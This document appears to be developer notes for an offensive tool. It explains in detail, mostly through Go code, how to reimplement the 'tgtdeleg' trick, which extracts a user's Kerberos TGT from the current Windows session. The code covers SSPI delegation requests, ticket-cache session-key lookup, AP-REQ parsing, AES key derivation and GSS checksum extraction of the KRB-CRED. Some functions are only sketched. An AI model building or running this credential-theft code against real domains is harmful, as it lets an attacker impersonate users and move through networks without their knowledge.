# TGTDeleg: Go Implementation Deep Dive

> This document covers the technical details of implementing the TGTDeleg trick in Go, including all the pain points and solutions we discovered.

## Table of Contents

1. [Overview](#overview)
2. [Windows API Calls](#windows-api-calls)
3. [The Session Key Problem](#the-session-key-problem)
4. [ASN.1 Parsing Challenges](#asn1-parsing-challenges)
5. [AES Decryption: The n-fold Saga](#aes-decryption-the-n-fold-saga)
6. [GSS Checksum Parsing](#gss-checksum-parsing)
7. [Complete Code Walkthrough](#complete-code-walkthrough)
8. [Lessons Learned](#lessons-learned)

---

## Overview

Implementing tgtdeleg in Go requires:

1. **Windows syscalls** via `syscall` package to call SSPI
2. **ASN.1 parsing** for Kerberos structures (custom, not `encoding/asn1`)
3. **AES-256-CTS-HMAC-SHA1** decryption with correct key derivation
4. **GSS checksum parsing** per RFC 4121

---

## Windows API Calls

### Required DLL Imports

```go
var (
    secur32 = syscall.NewLazyDLL("secur32.dll")
    
    procAcquireCredentialsHandleW  = secur32.NewProc("AcquireCredentialsHandleW")
    procInitializeSecurityContextW = secur32.NewProc("InitializeSecurityContextW")
    procQueryContextAttributesW    = secur32.NewProc("QueryContextAttributesW")
    procFreeCredentialsHandle      = secur32.NewProc("FreeCredentialsHandle")
    procDeleteSecurityContext      = secur32.NewProc("DeleteSecurityContext")
    procFreeContextBuffer          = secur32.NewProc("FreeContextBuffer")
)
```

### SSPI Structures in Go

```go
// SecHandle is the SSPI handle (credential or context)
type SecHandle struct {
    dwLower uintptr
    dwUpper uintptr
}

// SecBuffer holds token data
type SecBuffer struct {
    cbBuffer   uint32
    BufferType uint32
    pvBuffer   *byte
}

// SecBufferDesc describes a token buffer
type SecBufferDesc struct {
    ulVersion uint32
    cBuffers  uint32
    pBuffers  *SecBuffer
}

// TimeStamp for credential expiry
type TimeStamp struct {
    LowPart  uint32
    HighPart int32
}
```

### Step 1: Acquire Credentials Handle

```go
func acquireCredentials() (SecHandle, error) {
    var credHandle SecHandle
    var expiry TimeStamp
    
    kerberosPackage, _ := syscall.UTF16PtrFromString("Kerberos")
    
    ret, _, _ := procAcquireCredentialsHandleW.Call(
        0,                                        // pszPrincipal = NULL (current user)
        uintptr(unsafe.Pointer(kerberosPackage)), // pszPackage = "Kerberos"
        SECPKG_CRED_OUTBOUND,                     // Client credentials
        0, 0, 0, 0,                               // Optional params
        uintptr(unsafe.Pointer(&credHandle)),
        uintptr(unsafe.Pointer(&expiry)),
    )
    
    if ret != SEC_E_OK {
        return credHandle, fmt.Errorf("AcquireCredentialsHandle failed: 0x%x", ret)
    }
    return credHandle, nil
}
```

### Step 2: Initialize Security Context with Delegation

```go
func initSecurityContext(credHandle SecHandle, targetSPN string) ([]byte, SecHandle, error) {
    var secContext SecHandle
    var expiry TimeStamp
    var contextAttr uint32
    
    // Convert SPN to UTF-16
    targetName, _ := syscall.UTF16PtrFromString(targetSPN)
    
    // Prepare output buffer
    outBuffer := make([]byte, 16384)
    outSecBuffer := SecBuffer{
        cbBuffer:   uint32(len(outBuffer)),
        BufferType: SECBUFFER_TOKEN,
        pvBuffer:   &outBuffer[0],
    }
    outBufferDesc := SecBufferDesc{
        ulVersion: 0,
        cBuffers:  1,
        pBuffers:  &outSecBuffer,
    }
    
    // THE KEY FLAGS: Request delegation!
    contextReq := ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_ALLOCATE_MEMORY
    
    ret, _, _ := procInitializeSecurityContextW.Call(
        uintptr(unsafe.Pointer(&credHandle)),
        0,                                     // First call, no existing context
        uintptr(unsafe.Pointer(targetName)),
        uintptr(contextReq),
        0,
        uintptr(SECURITY_NATIVE_DREP),
        0,
        0,
        uintptr(unsafe.Pointer(&secContext)),
        uintptr(unsafe.Pointer(&outBufferDesc)),
        uintptr(unsafe.Pointer(&contextAttr)),
        uintptr(unsafe.Pointer(&expiry)),
    )
    
    // SEC_I_CONTINUE_NEEDED is expected (mutual auth)
    if ret != SEC_E_OK && ret != SEC_I_CONTINUE_NEEDED {
        return nil, secContext, fmt.Errorf("InitializeSecurityContext failed: 0x%x", ret)
    }
    
    // Return the AP-REQ token
    tokenData := make([]byte, outSecBuffer.cbBuffer)
    copy(tokenData, outBuffer[:outSecBuffer.cbBuffer])
    
    return tokenData, secContext, nil
}
```

---

## The Session Key Problem

### The Challenge

The authenticator inside the AP-REQ is encrypted with the **service ticket's session key**. We need this key to decrypt it and extract the TGT.

### Method 1: QueryContextAttributes (Often Fails!)

```go
const SECPKG_ATTR_SESSION_KEY = 9

type SecPkgContextSessionKey struct {
    SessionKeyLength uint32
    SessionKey       *byte
}

func getSessionKey(secContext SecHandle) ([]byte, error) {
    var sessionKeyInfo SecPkgContextSessionKey
    
    ret, _, _ := procQueryContextAttributesW.Call(
        uintptr(unsafe.Pointer(&secContext)),
        SECPKG_ATTR_SESSION_KEY,
        uintptr(unsafe.Pointer(&sessionKeyInfo)),
    )
    
    if ret != SEC_E_OK {
        // This often returns 0x80090301 (SEC_E_UNSUPPORTED_FUNCTION)!
        return nil, fmt.Errorf("QueryContextAttributes failed: 0x%x", ret)
    }
    
    key := make([]byte, sessionKeyInfo.SessionKeyLength)
    copy(key, unsafe.Slice(sessionKeyInfo.SessionKey, sessionKeyInfo.SessionKeyLength))
    return key, nil
}
```

**Why it fails:** Windows doesn't always expose the session key through this API. It depends on the security context state.

### Method 2: Ticket Cache Lookup (Our Solution)

When QueryContextAttributes fails, we look up the session key in the ticket cache:

```go
func getSessionKeyFromCache(spn string) ([]byte, int32, error) {
    // Use LsaCallAuthenticationPackage with KERB_RETRIEVE_TKT_REQUEST
    
    // 1. Get LSA handle
    var lsaHandle uintptr
    ret, _, _ := procLsaConnectUntrusted.Call(uintptr(unsafe.Pointer(&lsaHandle)))
    if ret != 0 {
        return nil, 0, fmt.Errorf("LsaConnectUntrusted failed")
    }
    defer procLsaDeregisterLogonProcess.Call(lsaHandle)
    
    // 2. Get Kerberos package ID
    packageID := getKerberosPackageID(lsaHandle)
    
    // 3. Build KERB_RETRIEVE_TKT_REQUEST for the SPN
    request := buildRetrieveTktRequest(spn, KERB_RETRIEVE_TICKET_AS_KERB_CRED)
    
    // 4. Call LsaCallAuthenticationPackage
    var response unsafe.Pointer
    var responseLen uint32
    var protocolStatus int32
    
    ret, _, _ = procLsaCallAuthenticationPackage.Call(
        lsaHandle,
        uintptr(packageID),
        uintptr(unsafe.Pointer(&request[0])),
        uintptr(len(request)),
        uintptr(unsafe.Pointer(&response)),
        uintptr(unsafe.Pointer(&responseLen)),
        uintptr(unsafe.Pointer(&protocolStatus)),
    )
    
    // 5. Parse response to extract session key and etype
    sessionKey, etype := parseRetrieveTktResponse(response, responseLen)
    
    return sessionKey, etype, nil
}
```

---

## ASN.1 Parsing Challenges

### The Problem with Go's encoding/asn1

Go's `encoding/asn1` package **cannot parse Kerberos structures** correctly because:

1. **APPLICATION tags**: Kerberos uses APPLICATION-tagged wrappers that Go doesn't handle
2. **Nested structures**: Deep nesting with explicit tags
3. **Optional fields**: Many optional context-tagged fields

### Example: Parsing AP-REQ

```go
// AP-REQ starts with APPLICATION 14 tag (0x6e)
// encoding/asn1 expects SEQUENCE, not APPLICATION

// WON'T WORK:
var apReq asn1krb5.APREQ
asn1.Unmarshal(data, &apReq) // FAILS!

// OUR SOLUTION: Manual parsing
func parseAPREQ(data []byte) (*APREQ, error) {
    // Skip GSS wrapper if present (OID 1.2.840.113554.1.2.2)
    if bytes.HasPrefix(data, gssKerberosOID) {
        data = skipGSSWrapper(data)
    }
    
    // Check for APPLICATION 14 tag
    if data[0] != 0x6e {
        return nil, fmt.Errorf("not an AP-REQ (expected 0x6e, got 0x%02x)", data[0])
    }
    
    // Parse length
    pos, length := parseASN1Length(data, 1)
    
    // Inner SEQUENCE
    if data[pos] != 0x30 {
        return nil, fmt.Errorf("expected SEQUENCE")
    }
    
    // Parse each field by context tag
    apReq := &APREQ{}
    pos, _ = parseASN1Length(data, pos+1)
    
    for pos < len(data) {
        tag := data[pos]
        switch tag {
        case 0xa0: // [0] pvno
            apReq.PVNo, pos = parseInt(data, pos)
        case 0xa1: // [1] msg-type
            apReq.MsgType, pos = parseInt(data, pos)
        case 0xa2: // [2] ap-options
            apReq.APOptions, pos = parseBitString(data, pos)
        case 0xa3: // [3] ticket
            apReq.Ticket, pos = parseTicket(data, pos)
        case 0xa4: // [4] authenticator
            apReq.Authenticator, pos = parseEncryptedData(data, pos)
        }
    }
    
    return apReq, nil
}
```

---

## AES Decryption: The n-fold Saga

### The Problem

AES decryption for Kerberos requires the **n-fold algorithm** from RFC 3961. Getting this wrong = decryption produces garbage.

### What n-fold Does

n-fold stretches a constant to a specific length for key derivation:

```
n-fold(constant, keySize) → derived key material
```

### Common Mistakes (We Made Them All!)

**Mistake 1: Wrong bit rotation direction**

```go
// WRONG: Rotating bytes instead of bits
func badNfold(input []byte, n int) []byte {
    // Rotating by 13 bytes, not 13 bits!
}
```

**Mistake 2: Wrong addition method**

```go
// WRONG: Two's complement addition
carry := 0
for i := len(result) - 1; i >= 0; i-- {
    sum := int(result[i]) + int(temp[i]) + carry
    result[i] = byte(sum & 0xff)
    carry = sum >> 8  // WRONG: should be one's-complement!
}
```

### Correct n-fold Implementation

```go
// nfold implements the n-fold algorithm per RFC 3961
func nfold(input []byte, n int) []byte {
    inBits := len(input) * 8
    outBits := n * 8
    
    // LCM for total bits to process
    lcm := lcm(inBits, outBits)
    
    // Allocate output
    result := make([]byte, n)
    
    // Process each copy with 13-bit rotation
    for i := 0; i < lcm/inBits; i++ {
        // Create rotated copy
        rotBits := (13 * i) % inBits
        rotated := rotateRight(input, rotBits)
        
        // Add with one's-complement arithmetic
        onesComplementAdd(result, rotated, i*inBits/8)
    }
    
    return result
}

// rotateRight rotates a byte slice right by n BITS
func rotateRight(data []byte, bits int) []byte {
    if bits == 0 {
        return append([]byte{}, data...)
    }
    
    bytes := bits / 8
    bits = bits % 8
    
    result := make([]byte, len(data))
    for i := 0; i < len(data); i++ {
        srcIdx := (i - bytes + len(data)) % len(data)
        srcIdx2 := (srcIdx - 1 + len(data)) % len(data)
        
        if bits == 0 {
            result[i] = data[srcIdx]
        } else {
            result[i] = (data[srcIdx] >> bits) | (data[srcIdx2] << (8 - bits))
        }
    }
    return result
}

// onesComplementAdd adds with one's complement (carry wraps around)
func onesComplementAdd(dst, src []byte, offset int) {
    carry := 0
    for i := len(dst) - 1; i >= 0; i-- {
        srcIdx := (offset + i) % len(src)
        sum := int(dst[i]) + int(src[srcIdx]) + carry
        carry = sum >> 8
        dst[i] = byte(sum & 0xff)
    }
    
    // One's complement: wrap carry back around
    for carry > 0 {
        for i := len(dst) - 1; i >= 0 && carry > 0; i-- {
            sum := int(dst[i]) + carry
            carry = sum >> 8
            dst[i] = byte(sum & 0xff)
        }
    }
}
```

### Key Derivation

```go
func deriveKey(baseKey []byte, usage int, keyType string) []byte {
    // Build constant: usage number + type byte
    constant := []byte{byte(usage >> 24), byte(usage >> 16), byte(usage >> 8), byte(usage)}
    
    switch keyType {
    case "Kc": // Checksum key
        constant = append(constant, 0x99)
    case "Ke": // Encryption key
        constant = append(constant, 0xAA)
    case "Ki": // Integrity key
        constant = append(constant, 0x55)
    }
    
    // n-fold the constant to key length
    folded := nfold(constant, len(baseKey))
    
    // Encrypt with the base key
    return aesEncryptECB(baseKey, folded)
}
```

---

## GSS Checksum Parsing

```go
func parseGSSChecksum(cksum []byte) (*DelegationData, error) {
    if len(cksum) < 28 {
        return nil, fmt.Errorf("checksum too short")
    }
    
    // Bytes 0-3: Binding length (should be 16)
    bindingLen := binary.LittleEndian.Uint32(cksum[0:4])
    
    // Byte 20: Flags
    flags := cksum[20]
    if flags&0x01 == 0 {
        return nil, fmt.Errorf("GSS_C_DELEG_FLAG not set")
    }
    
    // Bytes 26-27: Delegation length
    delegLen := binary.LittleEndian.Uint16(cksum[26:28])
    
    if len(cksum) < 28+int(delegLen) {
        return nil, fmt.Errorf("not enough data for delegation")
    }
    
    // Bytes 28+: KRB-CRED (the TGT!)
    krbCred := cksum[28 : 28+delegLen]
    
    return &DelegationData{
        KrbCred: krbCred,
        Length:  delegLen,
    }, nil
}
```

---

## Complete Code Walkthrough

See [tgtdeleg.go](../pkg/windows/tgtdeleg.go) for the full implementation. Key functions:

| Function | Purpose |
|----------|---------|
| `ExtractTGTDeleg()` | Main entry point |
| `initSecurityContextForSPN()` | SSPI context creation |
| `parseAPREQ()` | Parse the output token |
| `decryptAuthenticator()` | AES decrypt with session key |
| `extractTGTFromAuthenticator()` | Parse GSS checksum, get TGT |

---

## Lessons Learned

### 1. Windows APIs are Finicky

- QueryContextAttributes doesn't always work
- Must have fallback to ticket cache lookup
- Error codes are cryptic (search for SEC_E_* constants)

### 2. ASN.1 is a Nightmare

- Go's encoding/asn1 doesn't work for Kerberos
- Write custom parsers or use asn1.RawValue
- APPLICATION tags need special handling

### 3. Cryptography Must Be Exact

- n-fold implementation must match RFC 3961 exactly
- One bit wrong = complete failure
- Test against known-good implementations (gokrb5, MIT krb5)

### 4. Debugging Tips

- Print hex dumps at every stage
- Compare with working tools (Rubeus, Wireshark)
- Use test vectors from RFCs

---

## References

- [RFC 4120](https://datatracker.ietf.org/doc/html/rfc4120) - Kerberos V5
- [RFC 4121](https://datatracker.ietf.org/doc/html/rfc4121) - GSS-API Mechanism
- [RFC 3961](https://datatracker.ietf.org/doc/html/rfc3961) - Encryption Specs
- [Rubeus Source](https://github.com/GhostPack/Rubeus) - C# reference implementation
- [gokrb5](https://github.com/jcmturner/gokrb5) - Go Kerberos library
